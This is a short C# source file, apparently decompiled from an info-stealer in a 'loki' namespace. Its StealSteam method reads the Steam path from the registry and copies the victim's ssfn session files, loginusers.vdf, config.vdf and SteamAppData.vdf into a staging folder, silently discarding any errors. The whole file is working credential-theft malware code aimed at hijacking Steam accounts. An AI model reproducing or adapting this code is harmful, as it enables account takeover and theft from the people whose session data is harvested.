using System;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace loki.loki.Utilies.App
{
	// Token: 0x0200002E RID: 46
	internal class Steam
	{
		// Token: 0x17000041 RID: 65
		// (get) Token: 0x06000177 RID: 375 RVA: 0x0000A16C File Offset: 0x0000836C
		// (set) Token: 0x06000178 RID: 376 RVA: 0x0000A173 File Offset: 0x00008373
		public static object Identifier { get; private set; }

		// Token: 0x06000179 RID: 377 RVA: 0x0000A17C File Offset: 0x0000837C
		public static void StealSteam(string dir)
		{
			try
			{
				Directory.CreateDirectory(dir + "\\Apps\\Steam");
				string text = Path.Combine(dir, "Apps\\Steam");
				object value = Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);
				if (value != null)
				{
					string text2 = value.ToString();
					StringBuilder stringBuilder = new StringBuilder();
					string text3 = string.Empty;
					foreach (char value2 in text2)
					{
						if (value2.Equals('/'))
						{
							stringBuilder.Append("\\");
						}
						else
						{
							stringBuilder.Append(value2);
						}
					}
					text3 = stringBuilder.ToString();
					if (Directory.Exists(text3))
					{
						Directory.CreateDirectory(text);
						foreach (string text5 in Directory.GetFiles(text3, "ssfn*"))
						{
							string fileName = Path.GetFileName(text5);
							File.Copy(text5, Path.Combine(text, fileName), true);
						}
						if (File.Exists(text3 + "\\config\\config.vdf"))
						{
							File.Copy(text3 + "\\config\\config.vdf", text + "\\config.vdf");
						}
						if (File.Exists(text3 + "\\config\\loginusers.vdf"))
						{
							File.Copy(text3 + "\\config\\loginusers.vdf", text + "\\loginusers.vdf");
						}
						if (File.Exists(text3 + "\\config\\SteamAppData.vdf"))
						{
							File.Copy(text3 + "\\config\\SteamAppData.vdf", text + "\\SteamAppData.vdf");
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
